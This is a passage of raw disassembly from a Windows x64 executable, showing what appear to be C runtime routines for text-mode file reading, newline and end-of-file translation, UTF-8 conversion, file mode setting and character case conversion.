   14000c858:	4c 8d 15 a1 37 ff ff 	lea    -0xc85f(%rip),%r10        # 0x140000000
   14000c85f:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c866:	00 
   14000c867:	42 f6 44 30 08 48    	testb  $0x48,0x8(%rax,%r14,1)
   14000c86d:	74 1f                	je     0x14000c88e
   14000c86f:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000c874:	38 55 58             	cmp    %dl,0x58(%rbp)
   14000c877:	74 24                	je     0x14000c89d
   14000c879:	40 88 33             	mov    %sil,(%rbx)
   14000c87c:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c883:	00 
   14000c884:	8a 45 58             	mov    0x58(%rbp),%al
   14000c887:	42 88 44 31 09       	mov    %al,0x9(%rcx,%r14,1)
   14000c88c:	eb 47                	jmp    0x14000c8d5
   14000c88e:	49 3b df             	cmp    %r15,%rbx
   14000c891:	75 0e                	jne    0x14000c8a1
   14000c893:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000c898:	38 55 58             	cmp    %dl,0x58(%rbp)
   14000c89b:	75 04                	jne    0x14000c8a1
   14000c89d:	88 13                	mov    %dl,(%rbx)
   14000c89f:	eb 34                	jmp    0x14000c8d5
   14000c8a1:	8b 4d 48             	mov    0x48(%rbp),%ecx
   14000c8a4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c8aa:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000c8ae:	e8 8d d4 ff ff       	call   0x140009d40
   14000c8b3:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000c8b8:	4c 8d 15 41 37 ff ff 	lea    -0xc8bf(%rip),%r10        # 0x140000000
   14000c8bf:	38 55 58             	cmp    %dl,0x58(%rbp)
   14000c8c2:	74 14                	je     0x14000c8d8
   14000c8c4:	eb 0c                	jmp    0x14000c8d2
   14000c8c6:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000c8cb:	4c 8d 15 2e 37 ff ff 	lea    -0xc8d2(%rip),%r10        # 0x140000000
   14000c8d2:	40 88 33             	mov    %sil,(%rbx)
   14000c8d5:	48 ff c3             	inc    %rbx
   14000c8d8:	4c 3b 65 e8          	cmp    -0x18(%rbp),%r12
   14000c8dc:	0f 82 f7 fe ff ff    	jb     0x14000c7d9
   14000c8e2:	eb 23                	jmp    0x14000c907
   14000c8e4:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c8eb:	00 
   14000c8ec:	42 8a 44 31 08       	mov    0x8(%rcx,%r14,1),%al
   14000c8f1:	a8 40                	test   $0x40,%al
   14000c8f3:	75 09                	jne    0x14000c8fe
   14000c8f5:	0c 02                	or     $0x2,%al
   14000c8f7:	42 88 44 31 08       	mov    %al,0x8(%rcx,%r14,1)
   14000c8fc:	eb 09                	jmp    0x14000c907
   14000c8fe:	41 8a 04 24          	mov    (%r12),%al
   14000c902:	88 03                	mov    %al,(%rbx)
   14000c904:	48 ff c3             	inc    %rbx
   14000c907:	8b f3                	mov    %ebx,%esi
   14000c909:	41 2b f7             	sub    %r15d,%esi
   14000c90c:	80 7d 60 01          	cmpb   $0x1,0x60(%rbp)
   14000c910:	0f 85 b9 01 00 00    	jne    0x14000cacf
   14000c916:	85 f6                	test   %esi,%esi
   14000c918:	0f 84 b1 01 00 00    	je     0x14000cacf
   14000c91e:	48 ff cb             	dec    %rbx
   14000c921:	f6 03 80             	testb  $0x80,(%rbx)
   14000c924:	75 08                	jne    0x14000c92e
   14000c926:	48 ff c3             	inc    %rbx
   14000c929:	e9 b2 00 00 00       	jmp    0x14000c9e0
   14000c92e:	ba 01 00 00 00       	mov    $0x1,%edx
   14000c933:	eb 0f                	jmp    0x14000c944
   14000c935:	83 fa 04             	cmp    $0x4,%edx
   14000c938:	7f 17                	jg     0x14000c951
   14000c93a:	49 3b df             	cmp    %r15,%rbx
   14000c93d:	72 12                	jb     0x14000c951
   14000c93f:	48 ff cb             	dec    %rbx
   14000c942:	ff c2                	inc    %edx
   14000c944:	0f b6 03             	movzbl (%rbx),%eax
   14000c947:	42 38 bc 10 90 a2 01 	cmp    %dil,0x1a290(%rax,%r10,1)
   14000c94e:	00 
   14000c94f:	74 e4                	je     0x14000c935
   14000c951:	0f b6 0b             	movzbl (%rbx),%ecx
   14000c954:	42 0f be 84 11 90 a2 	movsbl 0x1a290(%rcx,%r10,1),%eax
   14000c95b:	01 00 
   14000c95d:	85 c0                	test   %eax,%eax
   14000c95f:	75 10                	jne    0x14000c971
   14000c961:	e8 12 7c ff ff       	call   0x140004578
   14000c966:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000c96c:	e9 af fd ff ff       	jmp    0x14000c720
   14000c971:	ff c0                	inc    %eax
   14000c973:	3b c2                	cmp    %edx,%eax
   14000c975:	75 08                	jne    0x14000c97f
   14000c977:	48 63 c2             	movslq %edx,%rax
   14000c97a:	48 03 d8             	add    %rax,%rbx
   14000c97d:	eb 61                	jmp    0x14000c9e0
   14000c97f:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000c986:	00 
   14000c987:	42 f6 44 30 08 48    	testb  $0x48,0x8(%rax,%r14,1)
   14000c98d:	74 3e                	je     0x14000c9cd
   14000c98f:	48 ff c3             	inc    %rbx
   14000c992:	42 88 4c 30 09       	mov    %cl,0x9(%rax,%r14,1)
   14000c997:	83 fa 02             	cmp    $0x2,%edx
   14000c99a:	7c 12                	jl     0x14000c9ae
   14000c99c:	8a 03                	mov    (%rbx),%al
   14000c99e:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c9a5:	00 
   14000c9a6:	48 ff c3             	inc    %rbx
   14000c9a9:	42 88 44 31 39       	mov    %al,0x39(%rcx,%r14,1)
   14000c9ae:	83 fa 03             	cmp    $0x3,%edx
   14000c9b1:	75 12                	jne    0x14000c9c5
   14000c9b3:	8a 03                	mov    (%rbx),%al
   14000c9b5:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000c9bc:	00 
   14000c9bd:	48 ff c3             	inc    %rbx
   14000c9c0:	42 88 44 31 3a       	mov    %al,0x3a(%rcx,%r14,1)
   14000c9c5:	48 63 c2             	movslq %edx,%rax
   14000c9c8:	48 2b d8             	sub    %rax,%rbx
   14000c9cb:	eb 13                	jmp    0x14000c9e0
   14000c9cd:	8b 4d 48             	mov    0x48(%rbp),%ecx
   14000c9d0:	f7 da                	neg    %edx
   14000c9d2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c9d8:	48 63 d2             	movslq %edx,%rdx
   14000c9db:	e8 60 d3 ff ff       	call   0x140009d40
   14000c9e0:	8b 45 f0             	mov    -0x10(%rbp),%eax
   14000c9e3:	4c 8b 65 50          	mov    0x50(%rbp),%r12
   14000c9e7:	41 2b df             	sub    %r15d,%ebx
   14000c9ea:	d1 e8                	shr    $1,%eax
   14000c9ec:	44 8b cb             	mov    %ebx,%r9d
   14000c9ef:	4d 8b c7             	mov    %r15,%r8
   14000c9f2:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000c9f6:	33 d2                	xor    %edx,%edx
   14000c9f8:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000c9fd:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000ca02:	ff 15 a8 47 00 00    	call   *0x47a8(%rip)        # 0x1400111b0
   14000ca08:	8b f0                	mov    %eax,%esi
   14000ca0a:	85 c0                	test   %eax,%eax
   14000ca0c:	75 15                	jne    0x14000ca23
   14000ca0e:	ff 15 7c 46 00 00    	call   *0x467c(%rip)        # 0x140011090
   14000ca14:	8b c8                	mov    %eax,%ecx
   14000ca16:	e8 0d 7b ff ff       	call   0x140004528
   14000ca1b:	83 cb ff             	or     $0xffffffff,%ebx
   14000ca1e:	e9 b3 00 00 00       	jmp    0x14000cad6
   14000ca23:	3b c3                	cmp    %ebx,%eax
   14000ca25:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   14000ca28:	48 8d 05 d1 35 ff ff 	lea    -0xca2f(%rip),%rax        # 0x140000000
   14000ca2f:	4a 8b 84 e8 10 af 01 	mov    0x1af10(%rax,%r13,8),%rax
   14000ca36:	00 
   14000ca37:	40 0f 95 c7          	setne  %dil
   14000ca3b:	03 f6                	add    %esi,%esi
   14000ca3d:	42 89 7c 30 48       	mov    %edi,0x48(%rax,%r14,1)
   14000ca42:	e9 8f 00 00 00       	jmp    0x14000cad6
   14000ca47:	39 7d e8             	cmp    %edi,-0x18(%rbp)
   14000ca4a:	0f 84 a0 00 00 00    	je     0x14000caf0
   14000ca50:	8b c6                	mov    %esi,%eax
   14000ca52:	4d 8b c7             	mov    %r15,%r8
   14000ca55:	4d 8b cf             	mov    %r15,%r9
   14000ca58:	99                   	cltd
   14000ca59:	2b c2                	sub    %edx,%eax
   14000ca5b:	d1 f8                	sar    $1,%eax
   14000ca5d:	48 63 c8             	movslq %eax,%rcx
   14000ca60:	49 8d 14 4f          	lea    (%r15,%rcx,2),%rdx
   14000ca64:	4c 3b fa             	cmp    %rdx,%r15
   14000ca67:	73 5b                	jae    0x14000cac4
   14000ca69:	be 0d 00 00 00       	mov    $0xd,%esi
   14000ca6e:	8d 4e fd             	lea    -0x3(%rsi),%ecx
   14000ca71:	41 0f b7 01          	movzwl (%r9),%eax
   14000ca75:	66 83 f8 1a          	cmp    $0x1a,%ax
   14000ca79:	74 3b                	je     0x14000cab6
   14000ca7b:	66 3b c6             	cmp    %si,%ax
   14000ca7e:	74 0e                	je     0x14000ca8e
   14000ca80:	66 41 89 00          	mov    %ax,(%r8)
   14000ca84:	49 83 c0 02          	add    $0x2,%r8
   14000ca88:	49 83 c1 02          	add    $0x2,%r9
   14000ca8c:	eb 21                	jmp    0x14000caaf
   14000ca8e:	48 8d 42 fe          	lea    -0x2(%rdx),%rax
   14000ca92:	4c 3b c8             	cmp    %rax,%r9
   14000ca95:	73 18                	jae    0x14000caaf
   14000ca97:	49 83 c1 02          	add    $0x2,%r9
   14000ca9b:	66 41 39 09          	cmp    %cx,(%r9)
   14000ca9f:	75 06                	jne    0x14000caa7
   14000caa1:	66 41 89 08          	mov    %cx,(%r8)
   14000caa5:	eb 04                	jmp    0x14000caab
   14000caa7:	66 41 89 30          	mov    %si,(%r8)
   14000caab:	49 83 c0 02          	add    $0x2,%r8
   14000caaf:	4c 3b ca             	cmp    %rdx,%r9
   14000cab2:	72 bd                	jb     0x14000ca71
   14000cab4:	eb 0e                	jmp    0x14000cac4
   14000cab6:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000cabd:	00 
   14000cabe:	42 80 4c 30 08 02    	orb    $0x2,0x8(%rax,%r14,1)
   14000cac4:	4d 2b c7             	sub    %r15,%r8
   14000cac7:	49 8b f0             	mov    %r8,%rsi
   14000caca:	48 d1 fe             	sar    $1,%rsi
   14000cacd:	03 f6                	add    %esi,%esi
   14000cacf:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   14000cad2:	4c 8b 65 50          	mov    0x50(%rbp),%r12
   14000cad6:	4d 3b fc             	cmp    %r12,%r15
   14000cad9:	74 08                	je     0x14000cae3
   14000cadb:	49 8b cf             	mov    %r15,%rcx
   14000cade:	e8 b1 6c ff ff       	call   0x140003794
   14000cae3:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000cae6:	0f 44 de             	cmove  %esi,%ebx
   14000cae9:	8b c3                	mov    %ebx,%eax
   14000caeb:	e9 fb 01 00 00       	jmp    0x14000cceb
   14000caf0:	85 d2                	test   %edx,%edx
   14000caf2:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000caf7:	74 0a                	je     0x14000cb03
   14000caf9:	66 41 39 17          	cmp    %dx,(%r15)
   14000cafd:	75 04                	jne    0x14000cb03
   14000caff:	0c 04                	or     $0x4,%al
   14000cb01:	eb 02                	jmp    0x14000cb05
   14000cb03:	24 fb                	and    $0xfb,%al
   14000cb05:	42 88 44 31 08       	mov    %al,0x8(%rcx,%r14,1)
   14000cb0a:	48 63 c6             	movslq %esi,%rax
   14000cb0d:	49 8b df             	mov    %r15,%rbx
   14000cb10:	49 03 c7             	add    %r15,%rax
   14000cb13:	4d 8b e7             	mov    %r15,%r12
   14000cb16:	48 89 45 60          	mov    %rax,0x60(%rbp)
   14000cb1a:	4c 3b f8             	cmp    %rax,%r15
   14000cb1d:	0f 83 6a 01 00 00    	jae    0x14000cc8d
   14000cb23:	be 0d 00 00 00       	mov    $0xd,%esi
   14000cb28:	41 0f b7 04 24       	movzwl (%r12),%eax
   14000cb2d:	66 83 f8 1a          	cmp    $0x1a,%ax
   14000cb31:	0f 84 30 01 00 00    	je     0x14000cc67
   14000cb37:	66 3b c6             	cmp    %si,%ax
   14000cb3a:	74 10                	je     0x14000cb4c
   14000cb3c:	66 89 03             	mov    %ax,(%rbx)
   14000cb3f:	48 83 c3 02          	add    $0x2,%rbx
   14000cb43:	49 83 c4 02          	add    $0x2,%r12
   14000cb47:	e9 0f 01 00 00       	jmp    0x14000cc5b
   14000cb4c:	48 8b 45 60          	mov    0x60(%rbp),%rax
   14000cb50:	48 83 c0 fe          	add    $0xfffffffffffffffe,%rax
   14000cb54:	4c 3b e0             	cmp    %rax,%r12
   14000cb57:	73 1b                	jae    0x14000cb74
   14000cb59:	49 8d 44 24 02       	lea    0x2(%r12),%rax
   14000cb5e:	66 39 10             	cmp    %dx,(%rax)
   14000cb61:	75 09                	jne    0x14000cb6c
   14000cb63:	49 83 c4 04          	add    $0x4,%r12
   14000cb67:	e9 b0 00 00 00       	jmp    0x14000cc1c
   14000cb6c:	4c 8b e0             	mov    %rax,%r12
   14000cb6f:	e9 e0 00 00 00       	jmp    0x14000cc54
   14000cb74:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000cb7b:	00 
   14000cb7c:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
   14000cb80:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   14000cb84:	4a 8b 0c 31          	mov    (%rcx,%r14,1),%rcx
   14000cb88:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cb8e:	49 83 c4 02          	add    $0x2,%r12
   14000cb92:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000cb97:	ff 15 bb 44 00 00    	call   *0x44bb(%rip)        # 0x140011058
   14000cb9d:	85 c0                	test   %eax,%eax
   14000cb9f:	75 0e                	jne    0x14000cbaf
   14000cba1:	ff 15 e9 44 00 00    	call   *0x44e9(%rip)        # 0x140011090
   14000cba7:	85 c0                	test   %eax,%eax
   14000cba9:	0f 85 99 00 00 00    	jne    0x14000cc48
   14000cbaf:	39 7d dc             	cmp    %edi,-0x24(%rbp)
   14000cbb2:	0f 84 90 00 00 00    	je     0x14000cc48
   14000cbb8:	4c 8d 15 41 34 ff ff 	lea    -0xcbbf(%rip),%r10        # 0x140000000
   14000cbbf:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000cbc6:	00 
   14000cbc7:	42 f6 44 30 08 48    	testb  $0x48,0x8(%rax,%r14,1)
   14000cbcd:	74 3d                	je     0x14000cc0c
   14000cbcf:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000cbd4:	66 39 55 d8          	cmp    %dx,-0x28(%rbp)
   14000cbd8:	74 42                	je     0x14000cc1c
   14000cbda:	66 89 33             	mov    %si,(%rbx)
   14000cbdd:	8a 45 d8             	mov    -0x28(%rbp),%al
   14000cbe0:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000cbe7:	00 
   14000cbe8:	42 88 44 31 09       	mov    %al,0x9(%rcx,%r14,1)
   14000cbed:	8a 45 d9             	mov    -0x27(%rbp),%al
   14000cbf0:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000cbf7:	00 
   14000cbf8:	42 88 44 31 39       	mov    %al,0x39(%rcx,%r14,1)
   14000cbfd:	4b 8b 84 ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rax
   14000cc04:	00 
   14000cc05:	42 88 54 30 3a       	mov    %dl,0x3a(%rax,%r14,1)
   14000cc0a:	eb 4b                	jmp    0x14000cc57
   14000cc0c:	49 3b df             	cmp    %r15,%rbx
   14000cc0f:	75 10                	jne    0x14000cc21
   14000cc11:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000cc16:	66 39 55 d8          	cmp    %dx,-0x28(%rbp)
   14000cc1a:	75 05                	jne    0x14000cc21
   14000cc1c:	66 89 13             	mov    %dx,(%rbx)
   14000cc1f:	eb 36                	jmp    0x14000cc57
   14000cc21:	8b 4d 48             	mov    0x48(%rbp),%ecx
   14000cc24:	48 c7 c2 fe ff ff ff 	mov    $0xfffffffffffffffe,%rdx
   14000cc2b:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   14000cc2f:	e8 0c d1 ff ff       	call   0x140009d40
   14000cc34:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000cc39:	4c 8d 15 c0 33 ff ff 	lea    -0xcc40(%rip),%r10        # 0x140000000
   14000cc40:	66 39 55 d8          	cmp    %dx,-0x28(%rbp)
   14000cc44:	74 15                	je     0x14000cc5b
   14000cc46:	eb 0c                	jmp    0x14000cc54
   14000cc48:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000cc4d:	4c 8d 15 ac 33 ff ff 	lea    -0xcc54(%rip),%r10        # 0x140000000
   14000cc54:	66 89 33             	mov    %si,(%rbx)
   14000cc57:	48 83 c3 02          	add    $0x2,%rbx
   14000cc5b:	4c 3b 65 60          	cmp    0x60(%rbp),%r12
   14000cc5f:	0f 82 c3 fe ff ff    	jb     0x14000cb28
   14000cc65:	eb 26                	jmp    0x14000cc8d
   14000cc67:	4b 8b 8c ea 10 af 01 	mov    0x1af10(%r10,%r13,8),%rcx
   14000cc6e:	00 
   14000cc6f:	42 8a 44 31 08       	mov    0x8(%rcx,%r14,1),%al
   14000cc74:	a8 40                	test   $0x40,%al
   14000cc76:	75 09                	jne    0x14000cc81
   14000cc78:	0c 02                	or     $0x2,%al
   14000cc7a:	42 88 44 31 08       	mov    %al,0x8(%rcx,%r14,1)
   14000cc7f:	eb 0c                	jmp    0x14000cc8d
   14000cc81:	41 0f b7 04 24       	movzwl (%r12),%eax
   14000cc86:	66 89 03             	mov    %ax,(%rbx)
   14000cc89:	48 83 c3 02          	add    $0x2,%rbx
   14000cc8d:	41 2b df             	sub    %r15d,%ebx
   14000cc90:	8b f3                	mov    %ebx,%esi
   14000cc92:	e9 38 fe ff ff       	jmp    0x14000cacf
   14000cc97:	ff 15 f3 43 00 00    	call   *0x43f3(%rip)        # 0x140011090
   14000cc9d:	83 f8 05             	cmp    $0x5,%eax
   14000cca0:	75 1b                	jne    0x14000ccbd
   14000cca2:	e8 d1 78 ff ff       	call   0x140004578
   14000cca7:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ccad:	e8 56 78 ff ff       	call   0x140004508
   14000ccb2:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   14000ccb8:	e9 63 fa ff ff       	jmp    0x14000c720
   14000ccbd:	83 f8 6d             	cmp    $0x6d,%eax
   14000ccc0:	0f 85 53 fa ff ff    	jne    0x14000c719
   14000ccc6:	8b df                	mov    %edi,%ebx
   14000ccc8:	e9 05 fe ff ff       	jmp    0x14000cad2
   14000cccd:	33 c0                	xor    %eax,%eax
   14000cccf:	eb 1a                	jmp    0x14000cceb
   14000ccd1:	e8 32 78 ff ff       	call   0x140004508
   14000ccd6:	89 38                	mov    %edi,(%rax)
   14000ccd8:	e8 9b 78 ff ff       	call   0x140004578
   14000ccdd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000cce3:	e8 40 74 ff ff       	call   0x140004128
   14000cce8:	83 c8 ff             	or     $0xffffffff,%eax
   14000cceb:	48 83 c4 58          	add    $0x58,%rsp
   14000ccef:	41 5f                	pop    %r15
   14000ccf1:	41 5e                	pop    %r14
   14000ccf3:	41 5d                	pop    %r13
   14000ccf5:	41 5c                	pop    %r12
   14000ccf7:	5f                   	pop    %rdi
   14000ccf8:	5e                   	pop    %rsi
   14000ccf9:	5b                   	pop    %rbx
   14000ccfa:	5d                   	pop    %rbp
   14000ccfb:	c3                   	ret
   14000ccfc:	48 83 ec 28          	sub    $0x28,%rsp
   14000cd00:	48 85 c9             	test   %rcx,%rcx
   14000cd03:	75 17                	jne    0x14000cd1c
   14000cd05:	e8 6e 78 ff ff       	call   0x140004578
   14000cd0a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000cd10:	e8 13 74 ff ff       	call   0x140004128
   14000cd15:	b8 16 00 00 00       	mov    $0x16,%eax
   14000cd1a:	eb 0a                	jmp    0x14000cd26
   14000cd1c:	8b 05 12 ef 00 00    	mov    0xef12(%rip),%eax        # 0x14001bc34
   14000cd22:	89 01                	mov    %eax,(%rcx)
   14000cd24:	33 c0                	xor    %eax,%eax
   14000cd26:	48 83 c4 28          	add    $0x28,%rsp
   14000cd2a:	c3                   	ret
   14000cd2b:	cc                   	int3
   14000cd2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cd31:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000cd36:	48 63 c1             	movslq %ecx,%rax
   14000cd39:	48 8d 3d d0 e1 00 00 	lea    0xe1d0(%rip),%rdi        # 0x14001af10
   14000cd40:	4c 8b d0             	mov    %rax,%r10
   14000cd43:	83 e0 1f             	and    $0x1f,%eax
   14000cd46:	49 c1 fa 05          	sar    $0x5,%r10
   14000cd4a:	4c 6b c0 58          	imul   $0x58,%rax,%r8
   14000cd4e:	4e 8b 0c d7          	mov    (%rdi,%r10,8),%r9
   14000cd52:	43 8a 44 01 38       	mov    0x38(%r9,%r8,1),%al
   14000cd57:	43 0f b6 4c 01 08    	movzbl 0x8(%r9,%r8,1),%ecx
   14000cd5d:	02 c0                	add    %al,%al
   14000cd5f:	8b d9                	mov    %ecx,%ebx
   14000cd61:	44 0f be d8          	movsbl %al,%r11d
   14000cd65:	81 e3 80 00 00 00    	and    $0x80,%ebx
   14000cd6b:	41 d1 fb             	sar    $1,%r11d
   14000cd6e:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
   14000cd74:	74 5b                	je     0x14000cdd1
   14000cd76:	81 fa 00 80 00 00    	cmp    $0x8000,%edx
   14000cd7c:	74 49                	je     0x14000cdc7
   14000cd7e:	8d 82 00 00 ff ff    	lea    -0x10000(%rdx),%eax
   14000cd84:	a9 ff ff fe ff       	test   $0xfffeffff,%eax
   14000cd89:	74 22                	je     0x14000cdad
   14000cd8b:	81 fa 00 00 04 00    	cmp    $0x40000,%edx
   14000cd91:	75 50                	jne    0x14000cde3
   14000cd93:	80 c9 80             	or     $0x80,%cl
   14000cd96:	43 88 4c 01 08       	mov    %cl,0x8(%r9,%r8,1)
   14000cd9b:	4a 8b 04 d7          	mov    (%rdi,%r10,8),%rax
   14000cd9f:	42 80 64 00 38 81    	andb   $0x81,0x38(%rax,%r8,1)
   14000cda5:	42 80 4c 00 38 01    	orb    $0x1,0x38(%rax,%r8,1)
   14000cdab:	eb 36                	jmp    0x14000cde3
   14000cdad:	80 c9 80             	or     $0x80,%cl
   14000cdb0:	43 88 4c 01 08       	mov    %cl,0x8(%r9,%r8,1)
   14000cdb5:	4a 8b 04 d7          	mov    (%rdi,%r10,8),%rax
   14000cdb9:	42 80 64 00 38 82    	andb   $0x82,0x38(%rax,%r8,1)
   14000cdbf:	42 80 4c 00 38 02    	orb    $0x2,0x38(%rax,%r8,1)
   14000cdc5:	eb 1c                	jmp    0x14000cde3
   14000cdc7:	80 e1 7f             	and    $0x7f,%cl
   14000cdca:	43 88 4c 01 08       	mov    %cl,0x8(%r9,%r8,1)
   14000cdcf:	eb 12                	jmp    0x14000cde3
   14000cdd1:	80 c9 80             	or     $0x80,%cl
   14000cdd4:	43 88 4c 01 08       	mov    %cl,0x8(%r9,%r8,1)
   14000cdd9:	4a 8b 0c d7          	mov    (%rdi,%r10,8),%rcx
   14000cddd:	42 80 64 01 38 80    	andb   $0x80,0x38(%rcx,%r8,1)
   14000cde3:	85 db                	test   %ebx,%ebx
   14000cde5:	75 07                	jne    0x14000cdee
   14000cde7:	b8 00 80 00 00       	mov    $0x8000,%eax
   14000cdec:	eb 0f                	jmp    0x14000cdfd
   14000cdee:	41 f7 db             	neg    %r11d
   14000cdf1:	1b c0                	sbb    %eax,%eax
   14000cdf3:	25 00 c0 00 00       	and    $0xc000,%eax
   14000cdf8:	05 00 40 00 00       	add    $0x4000,%eax
   14000cdfd:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000ce02:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   14000ce07:	c3                   	ret
   14000ce08:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000ce0d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000ce12:	55                   	push   %rbp
   14000ce13:	48 8b ec             	mov    %rsp,%rbp
   14000ce16:	48 83 ec 70          	sub    $0x70,%rsp
   14000ce1a:	48 63 f9             	movslq %ecx,%rdi
   14000ce1d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000ce21:	e8 16 81 ff ff       	call   0x140004f3c
   14000ce26:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   14000ce2c:	73 5d                	jae    0x14000ce8b
   14000ce2e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   14000ce32:	83 ba d4 00 00 00 01 	cmpl   $0x1,0xd4(%rdx)
   14000ce39:	7e 16                	jle    0x14000ce51
   14000ce3b:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000ce3f:	ba 01 00 00 00       	mov    $0x1,%edx
   14000ce44:	8b cf                	mov    %edi,%ecx
   14000ce46:	e8 79 01 00 00       	call   0x14000cfc4
   14000ce4b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   14000ce4f:	eb 0e                	jmp    0x14000ce5f
   14000ce51:	48 8b 82 08 01 00 00 	mov    0x108(%rdx),%rax
   14000ce58:	0f b7 04 78          	movzwl (%rax,%rdi,2),%eax
   14000ce5c:	83 e0 01             	and    $0x1,%eax
   14000ce5f:	85 c0                	test   %eax,%eax
   14000ce61:	74 10                	je     0x14000ce73
   14000ce63:	48 8b 82 10 01 00 00 	mov    0x110(%rdx),%rax
   14000ce6a:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   14000ce6e:	e9 c4 00 00 00       	jmp    0x14000cf37
   14000ce73:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000ce77:	74 0b                	je     0x14000ce84
   14000ce79:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000ce7d:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000ce84:	8b c7                	mov    %edi,%eax
   14000ce86:	e9 bd 00 00 00       	jmp    0x14000cf48
   14000ce8b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000ce8f:	83 b8 d4 00 00 00 01 	cmpl   $0x1,0xd4(%rax)
   14000ce96:	7e 2b                	jle    0x14000cec3
   14000ce98:	44 8b f7             	mov    %edi,%r14d
   14000ce9b:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000ce9f:	41 c1 fe 08          	sar    $0x8,%r14d
   14000cea3:	41 0f b6 ce          	movzbl %r14b,%ecx
   14000cea7:	e8 2c cb ff ff       	call   0x1400099d8
   14000ceac:	85 c0                	test   %eax,%eax
   14000ceae:	74 13                	je     0x14000cec3
   14000ceb0:	44 88 75 10          	mov    %r14b,0x10(%rbp)
   14000ceb4:	40 88 7d 11          	mov    %dil,0x11(%rbp)
   14000ceb8:	c6 45 12 00          	movb   $0x0,0x12(%rbp)
   14000cebc:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000cec1:	eb 18                	jmp    0x14000cedb
   14000cec3:	e8 b0 76 ff ff       	call   0x140004578
   14000cec8:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000cecd:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000ced3:	40 88 7d 10          	mov    %dil,0x10(%rbp)
   14000ced7:	c6 45 11 00          	movb   $0x0,0x11(%rbp)
   14000cedb:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   14000cedf:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000cee6:	00 
   14000cee7:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000ceeb:	8b 42 04             	mov    0x4(%rdx),%eax
   14000ceee:	48 8b 92 38 01 00 00 	mov    0x138(%rdx),%rdx
   14000cef5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   14000cefb:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000ceff:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000cf03:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   14000cf0a:	00 
   14000cf0b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000cf10:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   14000cf14:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000cf18:	e8 a7 ee ff ff       	call   0x14000bdc4
   14000cf1d:	85 c0                	test   %eax,%eax
   14000cf1f:	0f 84 4e ff ff ff    	je     0x14000ce73
   14000cf25:	83 f8 01             	cmp    $0x1,%eax
   14000cf28:	0f b6 45 20          	movzbl 0x20(%rbp),%eax
   14000cf2c:	74 09                	je     0x14000cf37
